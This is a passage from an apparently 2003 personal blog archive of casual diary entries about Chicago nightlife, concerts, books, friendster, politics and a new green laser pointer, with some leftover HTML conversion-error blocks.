also(of course) syncs with the ipod. Yesterday after the release a bunch of really <a href='http://ipodlounge.com/forums/forumdisplay.php?s=&amp;forumid=45'>negative comments</a> started appearing on forums around the internet. most of them were critical of the lack of features and the lack of windows integration. Some were complaints about how itunes didn&#8217;t conform to the windows standard in reagrds to UI and such. but as the night wore on..most people seemed pretty happy about the whole deal.. witnessing this I started to think about what was happening.. and then I remembered that in the mac world there is one vendor that creates pretty good applications(unlike the pc world <a href='http://www.microsoft.com'>:)</a>). but in the mac world - it seems that design and evolution of products is done inside apple(the corp) and that all of the innovation comes for their uncanny ability to identify good design. so there isn&#8217;t a lot of &#8220;mac&#8221; software competetion(there is of course independent software vendors - but only for nerds <b>;)</b>).. so itunes is the way it is due to good design.. <br />soooooo&#8230;. I guess it is interesting to see what design decisions is important to apple.. and to its users. and to compare that to the evolution that happens with products in the PC market. I really think that itunes has it going on.. but that suddenly the simple application that ruled the apple market is going to compete in the much more aggressive PC market. it should be interesting to see how the product matures.. <br /><br />ok so I have no clue if I make any sense. stupid lack of foresight..</p>

                <p>The other day a friend lent me one of the <a href='http://www.ckystore.com/'>CKY videos</a>. I watched it.. and laughed.. and whatever.. so I thought today that I should do a little searching about cky and all related info. so I came accross <a href='http://www.bamargera.com/home.html'>bam's</a> page. I was browsing it.. and came accross the <a href='http://www.bamargera.com/interview.html'>interview page</a>. it is funny.. but the real interesting part is his fashion tip: rock tight black gear but spray paint it mist of white so it looks dirty. this is interesting.. cuz on one of my sites a couple years ago.. me and a friend decided to mock the <a href='http://ironkungfu.com/wiki/index.php/RockStarScenester'>scenester lifestyle</a> and create a list of things to do to become a rock and roll scenester. we actually made them up.. so chekc out number 14: Buy tight black clothes but spray paint it a mist of white so it looks dirty. hehe. very similar. weird eh. so I did a google search to find whether I inadvertantly stole that phrase (<a href='http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=a+mist+of+white+so+it+looks+dirty'>here</a> and <a href='http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22a+mist+of+white+so+it+looks+dirty%22'>here</a>). the phrase only appears in bam&#8217;s interviews and my website. wtf. this is so confusing. how did this happen? I will never know. dylan left yesterday.. we had a good time. this week I am staying in. attempting to recoup my losses. I still want to convert cripple smash to php. it would rule.</p>

                <p>Friday I about died from hunger. I got home from work.. .actually .. I didn&#8217;t really get home form work. I went straight to atomix coffee shop and met dylan and hiromi.. also.. rachel, hans, marcia and nicole were all there. so it was awesome. we then hurried home and went to heat. heat was intense. we got a live fish and a bunch of really good sushi. I think that it was good. but it wasn&#8217;t worth the price the extra money they asked. I think it might have been better if we had gone to sushi wabi&#8230; but the live fish was <a href='http://nata2.info/pictures/events/dylan_and_meghan_visits_10_03/dylans%20visit%20002.jpg'>AWESOME</a>. it was insane. we watched it die.. and then we ate it 20 minutes later. heh. crazy. dylan LOVED it. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;on saturday we hung out and had GREAT italian food. &lt;a href=&quot;http://nata2.info/pictures/events/dylan_and_meghan_visits_10_03/dylans%20visit%20014.jpg&quot;&gt;Meghan visited&lt;/a&gt; and it was very nice to see her. dylan was really funny.. so we played a good trick on him.. hehe.&lt;Br&gt;&lt;br /&gt;today.. we got up late.. got lunch and juggled near the lake.. then we went to marks house and played dinner. &lt;br /&gt;&lt;br /&gt;now it is time for sleep.... ahhhhhhhh... sleeeeeeeep...</pre></p>

                <p>stupid media<br /> so <a href='http://www.newsday.com/news/local/wire/ny-bc-ny--gorbachev1007oct07,0,683156.story?coll=ny-ap-regional-wire'>gorbachev has called Bush's decision to invade Iraq a mistake</a>. wow, that is a surprise. I wonder why it matters when gorbachev says it.. but doesn&#8217;t matter when the citizens of the US say it. one thing that really pisses me off is that bush is all hot and bothered about national health care for IRAQ and the US is in them midst of a health care crisis and bush is rejecting any possible solution. that makes me mad. <br />hopefully people will start to notice that Bush is a bit <a href='http://www.salon.com/opinion/feature/2003/10/03/dean/index_np.html'>insane</a> and that his staff is just as sketchy as <a href='http://www.newsday.com/news/columnists/ny-vpcoc023477224oct02,0,7870288,print.column?coll=ny-news-columnists'>any previous presidential staff</a>. I think it is funn y that the &#8220;liberal media&#8221; often calls bush a <a href='http://thenation.com/doc.mhtml?i=20031013&amp;s=corn'>liar</a>. if he truely <a href='http://www.bushlies.com/topten.php'>lied that much</a> don&#8217;t you think the american people would notice?? well they don&#8217;t notice things like.. the <a href='http://thenation.com/doc.mhtml?i=20031020&amp;s=editors'>crazy war we are in and how bush totally screwed it up</a>&#8230; but then again.. the <a href='http://www.reuters.com/printerFriendlyPopup.jhtml?type=topNews&amp;storyID=3577501'>climate of the world has gotten so much better</a> since we liberated iraq. and it is a good thing we did it then.. cuz you never know <a href='http://slate.msn.com/id/2089471/'>what might have happened!!</a><br /><br /> in other news.. my brother is coming tomorrow night.. which means I should really make a reservation to <a href='http://entertainment.metromix.chicagotribune.com/top/1,1419,M-Metromix-Dining-!PlaceDetail-21889,00.html'>heat</a>. now I just have to assess how many people are going to come. I am excited for the weekend. we will have fun I think. hopefully he remembers to bring his arms ;)</p>

                <p>ahh.. irc.. how I love you. so all of a sudden irc is worried about accountability and reputation.. wtf. anyway.. I said would not that #ryan1918 was apparently not involved in the person who packeted my box. so here it is.. : <blockquote><small>
<b>[14:17]</b> (xygoat) but I will note it. <br />
<b>[14:17]</b> (ryan19188) at least say, #ryan1918 had nothing to do with the packeting or something.

<p>besides..

I understand where he is coming from.. it is just like a city though.. you don&#8217;t let other peoples shit affect you.. if I get ddosd by a bunch of punks.. than I do.. it isn&#8217;t his fault.. nor is it the fault of #novascotia. but whatever.. <br /><br /> you can do anything at <a href='http://www.zombo.com'>zombo.com</a></p>

                <p>so everyday for the past couple days I have been meaning to update my site. but I keep getting interupted or cool stuff happens and I am like ahh.. &#8220;later.&#8221;<br /><br />soo.. on thursday my friends and I went to <a href='http://www.brujeria.com/'>brujeria</a> at the aragon. it was incredible. the concert was apparently a mexican death metal festival - so there were a lot of bands. we got there at like 7 and the <a href='http://www.brujeria.com/'>brujeria</a> didn;t start until 12. I was tired. but the show was soo awesome. <a href='http://www.brujeria.com/'>brujeria</a> has a &#8220;hit&#8221; song called &#8221;<a href='http://www.lyrics.net.ua/song/9770'>matando gueros</a>&#8221; which in english means &#8220;kill whitey.&#8221; heh. it was pretty strange. but the band is so good. so it didn&#8217;t matter. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;Mike left on friday. it was pretty fun to have him around. on friday hiromi an I hung out and went to a phillip glass show &lt;a href=&quot;http://www.koyaanisqatsi.org/&quot;&gt;koyaanisqatsi&lt;/a&gt; at the chicago theatre. it was quite nice. kinda silly.. that minimalist crap is silly. but I liked it. and then we went to a middled eastern resturant called &lt;a href=&quot;http://entertainment.metromix.chicagotribune.com/top/1,1419,M-Metromix-Bars-!PlaceDetail-7357,00.html&quot;&gt;souk&lt;/a&gt;. it ruled. there was a belly dancer and a live band.. and rather good food. it was nice. I love good food. then we went to a couple parties. &lt;br /&gt;&lt;br /&gt;on saturday I slept in and then went shopping.. I couldn&apos;t really find anything so I gave up and went home.. but I found hiromi on the way home and we hung out.. then.. last night &lt;a href=&quot;http://www.therats.org&quot;&gt;matiss&lt;/a&gt;, lenore, &lt;a href=&quot;http://www.markhayward.net&quot;&gt;mark&lt;/a&gt; and myself all went to my friend &lt;a href=&quot;http://www.equulei.com/&quot;&gt;james&apos;&lt;/a&gt; party. it was a funny party. we then went to the signature lounge and attempted to have dessert. heh. it didn&apos;t work out. cuz.. they stop serving dessert after 12. stupid signature lounge.. 
&lt;br /&gt;&lt;br /&gt;ahhh.. now it is time to start another week. wheee.. </pre></p>

                <p>George Bush is an awesome president. America has lost 3.3 million jobs since Bush took office. In August, more than 93,000 jobs disappeared. 41 million Americans have no health insurance. (4 out of 5 of them are in working families.) This is the 29th month of the Bush recession. Right now, there are more than 9 million Americans who are looking for work. Bush has the worst jobs record of any president since Herbert Hoover during the Great Depression. More jobs lost than the last 11 presidents combined. I am so excited for his second term. I stole these stats from some site. <a href='http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=In+August%2C+more+than+93%2C000+jobs+disappeared%2E+41+million+Americans+have+no+health+insurance%2E'>I don't remember which</a>. <br /><br />i am tired. I go to sleep at a reasonable time. but I just can&#8217;t get rested. maybe I need ambien. hah. maybe I need some <a href='http://www.erowid.org/plants/datura/datura.shtml'>datura</a>. that would certainly change things. ok time to get busy. I keep losing friendsters. today I lost nic? but I can&#8217;t remember who nic is - so I guess it doesn&#8217;t matter. ;) <br /><br />at the metro the other night.. I gave my bling to some cute girl. I swear.. cute girls could ask me for my leg and I would cut it off and hand it to them. but I gave it to her.. and I didn&#8217;t get it back. I hope I find her again. she seemed cool and she was really cute. ;)</p>

                <p>apparently I need to practice before starting going out again. after a two week sabatical I went out again this weekend. it was fun - but I totally drank too much. so today I feel a little bit under the weather. stupid weather. my friend mike is in town and we have been hanging out. on friday night we went to eat at reza&#8217;s and then an art opening andthen a party. it was fun. then on saturday we went to get sushi, then a party, then a bar and then to the BRMC. it was a bunch of craziness and honestly was a bit out of control. heh. so then we came home and now it is today. I am sleepy.</p>

                <p>anyway.. so the movie &#8220;Lost in Translation&#8221; is good. I know. I saw it. it is nice. I enjoy Sofia Coppola&#8217;s movies. even though they are rather airy - it is an airy I appreciate. Bill Murrey was great.</p>

                <p>today I coked myself up on cold medicine and pain killers and made it to work on time.. did work fine.. maybe a little less conscious.. but for the most part fine. and as soon as I got home I crashed like a drunk driver. I guess that makes since. but now at 1 in the morning I am wired off my head and listening to classic rock. all I want to do is sleep. seriously. nothing else. but no. stupid god took sleep from me when he stole my heart. stupid god. <br /><br />so I am working on the perfect cocktail of cold medicine to keep me alert and full of work. it is kinda fun. except I am totally unable to maintain sanity while engaging in said cocktail. so far it is just vitamins, sudafed and some painkillers. also a little tiny bit of journey. I think that is the key. steve perry is healing my broken heart. stupid god. <br />i love sick based insomnia. I totally went to bed two hours ago. laid around miserable for 50 minutes. woke up insane. watched american chopper (the best show - seriously. I love it) and now am using my computer. I already signed off and said my goodnights once. stupid god. <br /><br />i need a severe life change - maybe a <a href='http://www.buell.com/en_us/products/motorcycles/blast/blastmain.asp'>motorcycle</a>.. or a <a href='http://www.mazdausa.com/MusaWeb/rx8/index.jsp'>new car</a>.. or a condo.. or whatever. something.<br /><br />i miss the days when I cared about the news.. like when I thought my opinioned mattered. it is interesting how seemingly follwoing the democratic process and calling my representative, voting in local ellections, and educating myself about the political climate and situation has destroyed all possible drive in my mind about politics. don&#8217;t get me wrong. it am still interested. I just don&#8217;t care to call a representative who is just going to give me to an underpaid, bored aid who doesn&#8217;t really care either. or why vote when the condidate you elect ends up not listening.. or my pay attention when you just see <a href='http://www.ajc.com/opinion/content/opinion/0903/22international.html?urac=n&urvf=10642377116960.8839345774896111'>MAJOR injustices</a> that nobody else seems to see.. - really though.. it hurts calling your representative and not getting through.. but I will still call. just with less enthusiasm - and voting.. of course I will vote. but with a VERY cynical mind.. and paying attention.. obviously others are as well.. but seriously.. does anybody in middle america besides the people who are just like me realize that <a href='http://www.verge.co.za/images/bush%20monkey.jpg'>bush</a> is completely <a href='http://www.pegmusic.com/let-cong-02_10-05.html'>insane</a>?<a href='http://www.bushisms.com/index1a.html#List'>?</a>?<a href='http://www.gwbush.com/'>?</a><br /><br />this all could be delerium talking.</p>

                <p>So this weekend was rather nice. On friday, some friends and I went and saw <a href='http://www.sonypictures.com/movies/onceuponatimeinmexico/'>once upon a time in mexico</a>. it was really fun. I love johnny depp. there was a lot of crazy violence. it was insane. blown knees and all. then hiromi, lavi and I went to dinner. hiromi and I went and visited marcia - but we were all so tired. so we went home. I was asleep by 12 oclock on friday. it ruled. I slept until way late on saturday and then went to my friend <a href='http://www.127th.com'>bryans</a> for a bbq. I love bbqs. they seem to bring out a lot of fun in people. I had these little &lt;A href=&#8221;http://www.millertime.com/about_highlife.jsp&#8221;&gt;7oz miller high life&lt;/a&gt; bottles that were the hit of the party. that night was coles party.. so we had primer margaritas, polishing off the remaining petron, and got ready to go. Coles party was really great. there were an ass load of people there.. and it ended up being super dope. a worlds colliding type of dope. <a href='http://nata2.info/?path=pictures/events/last_party_ever'>here</a> are some pictures.. <a href='http://www.ifd-lab.com/temp/sometimes/sometimes.html'>here are more</a>. The party didn&#8217;t really stop until early early in the morning. it was fun. a bunch(2) of coworkers were there.. it was great. sunday&#8230; I just chillled out. watched old school. played server. etc etc. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;i also.. &lt;a href=&quot;http://football.fantasysports.yahoo.com/f1/show?page=matchup&amp;lid=361151&amp;week=2&amp;mid1=10&amp;mid2=2&quot;&gt;won&lt;/a&gt; fantasy football. total chance. </pre></p>

                <p>The blue line is madness. in the past couple days crazy stuff has gone down. most of it is just crazies interacting with the normals. hehe. today this guy was ranting and raving and another guy tried to settle him down. so the reacted very negatively to that.. and told everyone on the train that he doesn&#8217;t &#8220;interact with homosexuals&#8221; and that he &#8220;has a spaceship and raygun from god.&#8221; He also claimed that he was a pro baseball player for the detroit tigers and that mariah carey was his second baseman. heh. the said thing is - that everyone tried to call him by confrontation. nobody attempted to actually calm him. they just yelled and antagonized. I don&#8217;t know what else they would do. but when everyone ignored him. he didn&#8217;t react. <br /><br />heh. I get old lady spam. most of it is about locksmithing and candles. I get NO porn spam. weird.</p>

                <p>So yesterday was nuts. I got up made sure I was packed for nyc and went to work. at work - I was whisked away on a cruise around lake michigan for employee appreciation day. We got free food - expensive drinks and generally had a nice time. I got to meet some of the new young people. I think we are going to start a young person club. it will be pretty dope I think&#8230; then at 2:00 or so we left.. I walked to the blue line.. went home.. grabbed my stuff.. taunted my brother over the phone.. went to o&#8217;hare and flew to pittsburgh. I hate flying non direct. I always forget.. but whatever. <br /><br />then I got into nyc at around 11. I went to tommie and marks place and putzed around with them for about an hour and then we went to this club called passerby. whew. it is insanity. it had a light up floor. and drinks. it is also full of craziness. seriously. mark got beat up by amjad and chris.. weird.. heh.. and everyone was nuts. I got into a bed around 7ish. hehe. it was a long day. I had been up for 24 hours.. well not really - if you don&#8217;t count the time difference it will have been 24 hours.. whatever. <br /><br />tonight.. umm.. apparently there is a party for xlr8r and lizzie?? from fischerspooner is having a virgo-fest.. both of which should be interesting.. oh yea. interesting. but yea<br /><br />nyc is rather dope. I wonder if it will be my next step. nobody knows. I like chicago. but chicago pales in comparison to nyc. but I like my job and don&#8217;t really want to leave the comfortable roomates and all that. besides it is kinda expensive. actually I think the housing is really expensive. sad day. maybe I can convince hiromi and matiss to move her.. adn then convince worldbook to also move here. hahaha.. nobody knows..</p>

                <p>so apparently I need to stop going out so late. cuz this morning I was punished. heh. so tired I was. Yesterday was generall a bad day. nothing really worked out well. I was able to go get dinner with <a href='http://www.markhayward.net'>mark</a> and his brother. that was a lot of fun. it was a bit hot out. so I was sweating like a pistol. anyway.. I then went home and inadvertently fell asleep on my lawn chair. that was incredible. I had lawn chair marks all over my face. hehe. a grid of sorts. my project at work is on its final legs.. so we are almost done. I love how I screw up colloquialisms. <br /><br />more and more people are recognizing me around town from friendster. weird.</p>

                <p>that the saddest song in the world is Samuel Barber&#8217;s <a href='http://www.artsworld.com/music-dance/works/a-c/adagio-for-strings-samuel-barber.html'>Adagio for strings</a>. It is used in &#8217;<a href='http://us.imdb.com/Title?0211915'>Amelie</a>&#8217;, &#8217;<a href=''>platoon</a>&#8217;, &#8217;<a href='http://us.imdb.com/Title?0080678'>elephant man</a>&#8217; and &#8217;<a href='http://us.imdb.com/Title?0104756'>Lorenzo's Oil</a>.&#8217; So sad it is. apparently it was also used as funeral music (Princess Grace, JFK, and Franklin D Roosevelt). William Orbit did a good arrangement of it for his &#8220;Adagio for Strings&#8221; album. <br /><br />So last night I went to felix&#8217;s bday party at vision. I hate vision. seriously. it is sooo bad. but it was cool to see <a href='http://nata2.info/pictures/misc/phone_camera/2157955332.jpg'>felix spin</a>. he really has a lot going on. bouncing and such. it was dope.

                <p>i guess I still need to write that paper on online communities and the socialization of online relationships. Especially in light of friendster and the development of virtual &#8221;<a href='http://www.stanford.edu/~pj97/Nietzsche.htm'>ubermensch</a>.&#8221; <br /><br />heh. I guess I wasn&#8217;t clear in what I was saying. I am naive enough to jump to the conclusion that I can use the idea of the ubermensch when talking about online communities.. when discussing the idea of ubermensch or overmen.. let us look at the above links definition: <blockquote><small>
"An overman as described by Zarathustra, the main character in Thus Spoke Zarathustra, is the one who is willing to risk all for the sake of enhancement of humanity. In contrary to the ?last man? whose sole desire is his own comfort and is incapable of creating anything beyond oneself in any form. This should suggest that an overman is someone who can establish his own values as the world in which others live their lives, often unaware that they are not pregiven.  This means an overman can affect and influence the lives of others. In other words, an overman has his own values, independent of others, which affects and dominates others? lives that may not have predetermined values but only herd instinct." </small></blockquote> the key here is that the ubermensch is someone who &#8220;has his own values, independent of others,&#8221; which helps to lift them to the top of the community they are involved in. The ubermensch I am talking right now is somewhat of a community leader. But they have no choice in the matter. They can know they are ubermensch.. Or they can not know.. it doesn&#8217;t matter. The idea is that there are ubermensch in social environments that act as hubs for the environment, keystones of sorts. They are so established in their own thinking/values/morals that people identify them as the real thing.. They become attractive/magnetic/whatever and people are drawn to them. They are able to transcend scene or venue or whatever.. <br /><br /></p>

<p>What is different in friendster is that the pseudo ubermensch are able to see each other. So they have the potential to bind together, compete and all that within a very small theatre. This allows for some interesting dynamics to occur. Check it.</p>

                <p>so I have recently been getting more and more random messages from people on friendster. This one really caught my eye. well it caught it by calling me an asshole&#8230; it rules. I was so surprised. at first I was honestly concerned.. but then.. I thought about it. and whatever.. hehe I rule. <blockquote><small>
How could you have all those friends??  You are such an asshole! I remember you in Chi-town and you were so fucking rude!  YOU ACTED LIKE YOU OWNED THE ROOM, GET A LIFE !!!!<br />-<a href='http://www.friendster.com/user.jsp?id=1185053'>Alexia</a></small></blockquote>Awesome eh.. I rule. I must have really affected her.

                <p>it isn&#8217;t hard per se. it is just rough. it is called <u>Into That Darkness</u>. it is about the <a href='http://motlc.wiesenthal.com/gallery/pg15/pg6/pg15687.html'>Franz Stangl</a> the commandant of <a href='http://motlc.wiesenthal.com/pages/t078/t07868.html'>treblinka</a>. When I first started reading the book - I thought &#8220;oh.. I can handle this.. it won&#8217;t be rought.. I have read about this stuff before.&#8221; little did I know.. <br />i think what is hard for me to understand is how workers at the extermination camps seemed to rationalize the killing. I can see how a government can get fucked up enough to start killing. I can see how a group can get misguided enough to start killings.. but I can&#8217;t understand how the people who worked there.. who were just &#8220;doing there jobs.&#8221; those people I do not get. it is totally confusing and baffeling. I also do not understand - why at the extermination camps.. they had to maintain the charade that they were not actually extermination camps to the people coming in to be exterminated. I understand why they needed to do this at first.. you can&#8217;t have people just coming off of the trains to die. you had to organize them and what not. . but why did they have to dehumanize them and such. heh. of course.. I am not the first to ask this. heh. nor will I be the last. <br /><br />i hope this never happens again.</p>

&lt;Br&gt;&lt;br /&gt;this weekend.. was dope. &lt;a href=&quot;http://nata2.info/?path=pictures%2Fparties%2Fkill_hannah_afterparty&amp;amp;img=kill%20hannah%20afterparty%20004.jpg&quot;&gt;we hung out&lt;/a&gt; in wicker park for this crazy block party. it was not as good as other block parties I have been too - but their were a lot of dope people. some good bands.. a good dj.. yea know.. lavi had a fashion show.. it was good stuff.. indeed&lt;br /&gt;&lt;br /&gt;after this - &lt;a href=&quot;http://nata2.info/?path=pictures%2Fparties%2Fkill_hannah_afterparty&amp;amp;img=kill%20hannah%20afterparty%20008.jpg&quot;&gt;we went&lt;/a&gt; to the &lt;a href=&quot;http://www.killhannah.com&quot;&gt;kill hannah&lt;/a&gt; show and hung out. Kill hannah is a fun band to see in concert. the crowd LOVES them. LOVES with a capital G. anyway.. after the show we went to watusi and chilled out. &lt;a href=http://nata2.info/?path=pictures%2Fparties%2Fkill_hannah_afterparty&amp;amp;img=kill%20hannah%20afterparty%20013.jpg&quot;&gt;tommie was spinning&lt;/a&gt;.. after watusi we went to harry&apos;s velvet room for some DJ action.. as you can see.. &lt;a href=&quot;http://nata2.info/?path=pictures%2Fparties%2Fkill_hannah_afterparty&amp;amp;img=kill%20hannah%20afterparty%20046.jpg&quot;&gt;it was a gooooood party&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;today matiss and I juggled for a kids bday party. it was nice.. kids. are sometimes mean.. but these kids were great. a couple of them were very intelligent. heh.</pre></p>

                <p>this weekend ruled. On friday I got my hair done and hung out with severn and some friends.. we got tacos and generally chilled. I then went to bed. it was awesome I love sleeping. So saturday we went to six flags to juggle for the mardi gras event. I don&#8217;t understand how mardi gras happens in august.. but whatever. the show was pretty laid back. just matiss and I juggling.. doing our general street performing show. it was fun&#8230; after that I went to the art and science party and then some random hipster party. it was really nice. I crashed.. woke up.. ate food.. and then I went to see MAIDEN. MAIDEN was awesome. seriously awesome.. I was worried that since they are old - it was going to suck. but no. they bounced around the stage like monkeys.. it was awesome.</p>

                <p>yesterday I had won some tickets to go and see a sneak preview of the movie <b>swat</b>. I was kinda excited - because I really enjoy colin farrell. So we showed up and bam. it was sold out. so we were stuck downtow with nothign to do. so we went and ate at rezas. I love feta cheese. I do.<br /><br />miriam was there which was cool. I hadn&#8217;t seen her in about 6 months. it was nice to see her. she was worried cuz she said her english is bad.. but it is still pretty good. I had forgotten how small she was. <br /><br />after dinner we went to my house and hung out on my back porch. it was nice. I played with my laser and was able to hit the clouds. it was madness. the clouds!!! they were low.. but I was still able to hit them. I can&#8217;t wait for my telescope to arrive.</p>

                <p>i love Lil Jon &amp; the Eastside Boyz. it is so fun to listen to . the energy level is very high. I wish I had a low rider or an escalade with dubs&#8230; serious. I would love to roll hard in an escalade listening to crunked up dirty south.. that is one of my many dreams. another one is to have an M5 and roll with maiden everywhere I went. someday I suppose. <br /><br />i love sitting at work listening to aggressive music. it always cracks me up - cu zi can&#8217;t sit still. I am always bouncing.. bounce bounce bounce. or head banging. haha. umm. just kidding. I have totally been caught too. it is always embarrasing. but whatever. <br /><br />our country is madness right now.

                <p>so last night when I went out with bernie, his friend phil and hiromi.. we fire my laser pointer to the top of the john hancock antennae. It was crazy. It totally was visible. Totally. I am a valley girl apparently. I can?t wait for it to get dark. I love the dark. Dark like a wolf.<br /><br />Laser pointer stats:&lt;blockquote&gt;&lt;small&gt; Standard Red laser pointer: 650nm wavelength; <br /> My Green laser pointer: 532 nm wavelength; &lt;5mW; range up to 9,000 ft (2600 m) in darkness &lt;/small&gt;&lt;/blockquote&gt; 9000 ft is <a href='http://www.onlineconversion.com/length_common.htm'>1.7045455 miles</a>&#8230;</p>
<br />
<p>So this afternoon. I am supposed to go visit a friend of a friend of mine on one of the tall ships&#8230; at the tall ship festival. I guess I am to check out the schooner Denis Sullivan.. . we shall see. this week has been full of meeting people I don&#8217;t really know. it rules. I love it. <br /><br /></p>

                <p>so I got my green laser in the mail. it is seriously bad ass. like seriously. hah. it is so powerful. I can not describe how powerful it is. it is soooo bright. even in daylight it has incredible visibility. I can shine it about a block away before I lose it. I am confident it is still visible to those near it&#8230;. but that I can&#8217;t see it.. anyway..<br />it is almost night and I am so excited to see the visible beam. w00t w00t. my love of light has come to its oft wanted apex&#8230;</p>

I am famous. haha. well not really.. but sorta. heh.<br /><br />tonight I went to spybar and as I left. I saw this HUGE pole fall onto incoming traffic at the 90/94 on ramp on ontario. it was INSANE. a HUGE pole. it crashed and went accross the ENTIRE street. so of course I ran over there to survey the damage. right as we ran (me and some homeless guys) a couple cars jumped the pole and crashed. it was insane. so we got to the pole and all traffic was stopped. so we grabb ed the pole and four of us pulled it out of the street. then I caught a cab and came home. <br /><br />i am a member of a table of contents.

                <p>so yesterday I read two books. it was madness. I just needed that stimulation I guess..</p>

<p>first I read <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;a href=&quot;http://www.amazon.com/exec/obidos/ASIN/0671027360/nata2productions&quot;&gt;Angels &amp; Demons&lt;/a&gt;</pre> by Dan Brown. It was pretty good. a very nice read. I felt that it was similar to those science/medical fiction books that are use a hihg base level of knowledge about the subject&#8230; the jargon I guess.. however Brown&#8217;s book is about catholicism, the vatican and such.. which makes it really fun to read - since I studied all of that crap in college. I guess it is like a trashy novel for an intellectual history/history of cathalocism buff.. hehe. I am going to start his other book: <a href='http://www.amazon.com/exec/obidos/ASIN/0345451511/nata2productions'>the davinci code</a> next. <br />Soon after I finished Angels &amp; Demons.. I did a bit of work.. and then needed to SLEEP. so to chill myself out I started reading <a href='http://www.amazon.com/exec/obidos/ASIN/0743225708/nata2productions'>Bringing Down the House</a>. this is a book about MIT students who used math and such to develop a sure fire way to count cards. it was fun. quick easy. but it left a bit of the nitty gritty out of the story. I wanted to hear about the strippers.. and all the nastiness of vegas. it was insane though. I am always interested in stories where ultra young people because uber rich. ;)<br /><br />so.. having stayed up til 4 reading books. ugh. I am now tired. oh so tired. need caffeine</p>

<p>So I signed up to be an affiliate and I was able to achieve the required 80 clicks in no time flat. and I received my pair of eternal life rings a couple months ago. I lent them to my friend chris.</p>
<blockquote><small>

<b>phunktoad </b>: what happened to your rings for eternal life<br />
<b>linUXkilla </b>: hey did you ever try those eternal life rings<br />
<b>ashtar1999 </b>: not yet. I was afraid I'd put them on backwards and die<br />
<b>phunktoad </b>: thats a valid point
</small>
</blockquote>
<p>tee hee. so anyway. I just remembered that I still have people clicking the link and I checked my number and it is like 800 or something. so I ordered some more. I ordered the fancy pair and then two pairs of the not so fancy pairs. hehe. it will RULE all. i will live FOREVER. FOREVER. <a href='http://www.storrer.com/images/forever.jpeg'>FOREVER</a></p>

                <p>oh yea. this weekend. hmm.. well one of the past three days.. I fell asleep listening to <a href='http://www.southernlord.com/sunn.htm'>Sunn 0))</a> (a very <a href='http://www.metal-sludge.com/'>sludge</a> <a href='http://www.doom-metal.com/'>doom metal</a> sound). anyway.. I was listening to them.. well really sleeping to them.. and my dreams were infused with chaos. I had three <a href='http://www.rjgeib.com/thoughts/killing/killing.jpg'>very violent</a> <a href='http://www.wsu.edu/DrUniverse/war.jpg'>war</a> <a href='http://homepage.mac.com/rhurt/gallery/archives/gl-dreams.jpg'>dreams</a> in <a href='http://www.pitcherinn.com/mallard1.jpg'>quick succession</a>. All three took place in my grandfathers hometown. The first was about being invaded and put into a camp.. I was made to march all around with all my friends and relatives. how fun. I think we were rather abused. I had to stop this dream. it got ugly. the second dream.. was just like the first.. but we knew about the previous dream.. and we acted and reacted accordingly. it was a lot more fun. and then the third was much more on our side. it was a much more fun dream to have. we ran about and hid from the evil. I attribute it all to doom metal. <br /><br />on friday night I hung out with marcia.. and we.. well.. oh we went to this house with a bunch of artists and chilled. it was nice. they were really cool. and then I went to a rather poor party. it wasn&#8217;t too bad. but the dj we walked in on was poor.. then it got really good. and then it was toruble. heh. so we left. I slept and on saturday.. I went to lula with matiss and then walked around.. adn then played quake a bit.. and then went to a performance.. and then went home and played quake a bit. and then did work. and then on sunday I got up did work. went to lula. played. did work. watched simpsons and bonzai.. <br /><br />bonzai was interesting. I don&#8217;t quite know what to think. on one hand it is rather <a href='http://la.indymedia.org/news/2003/07/73003_comment.php'>racist</a> and <a href='http://www.modelminority.com/images/postcards/banzai.gif'>not breaking down barriers</a>. but then on the other hand - it is really funny. I loved most of the skits. they are quite something. so I am not sure <a href='http://www.modelminority.com/article464.html'>where I stand</a>. they play up the <a href='http://www.engrish.com'>engrish</a> thing quite a bit&#8230; but whatever.. maybe I will decide later.. <br /><br /></p>

<p>right now however.. I am waiting for a new album from <a href='http://www.dimmu-borgir.com/'>dimmu borgir</a>.. I am excited. I got tix to see them in november. now that is planning. <br /><br /></p>

                <p>So today I got up.. got right to work. did a little bit of financial planning.. played with bank statements and suddenly noticed a very large charge from sprintpcs. so I called them and they suck. really. they suck so so much. they alleged that I received two phones, started a new service contract and then canceled. thus invoking about $600 of charges. So I talked to them and they have a different &#8220;story&#8221; on what happened and refuse to refund 400 of the 600. fuckin sweet. so angry. increidbly angry. I hate them. they are sooooooo frustrating. <br /><br />so last night I saw <a href='http://nata2.info/?path=pictures/shows/fischerspooner_heat_2003'>fischerspooner</a> again. it was fun.<br /><br />i am tired. there is not enough time in the day. it is annoying. I need like 10 more hours. and some more money. and a girlfriend. and a nice condo. and about 2 years of vacation. thanks.</p>

                <p>So there is this new movie out called <a href='http://www.filmthreat.com/Reviews.asp?Id=4629'>whole</a> which is about Body Integrity Identity Disorder - or the want to become a amputee. I haven&#8217;t seen it - however it will probably be interesting. we have seen this &lt;A href=&#8221;http://www.cutoffmyfeet.com/main.html&#8221;&gt;stuff&lt;/a&gt; before, but not to such an extent as outlined in the movie or in <a href='http://slate.msn.com/id/2085402/'>this</a> article. I think that this stuff is insane. I did like how lalala talked about the socialization of a psycological condition. it made me wonder about all this nonsense. is it socialized in people.. or has it always been this way. if it socialized - I don&#8217;t think it invalidates the affliction, just makes it more difficult to handle. <br /><br />i don&#8217;t know much about psychology. <br /><br />so you think that the <a href='http://www.cnn.com/2003/HEALTH/07/11/sars/index.html'>end of</a> <a href='http://news.bbc.co.uk/2/hi/3056921.stm'>the world</a> is <a href='http://www.religioustolerance.org/end_wrl3.htm#not'>coming</a>? if it is - I want to be <a href='http://abcnews.go.com/wire/US/ap20030711_76.html'>notified by voicemail</a>. If it does come.. maybe we will be lucky and have <a href='http://headlines.agapepress.org/archive/7/afa/102003a.asp'>these</a> people as our leaders. well wait&#8230; those are our <a href='http://www.onpointradio.org/content/2002/09/20/0912bush140.jpg'>leaders now</a>. doh! I love how now after 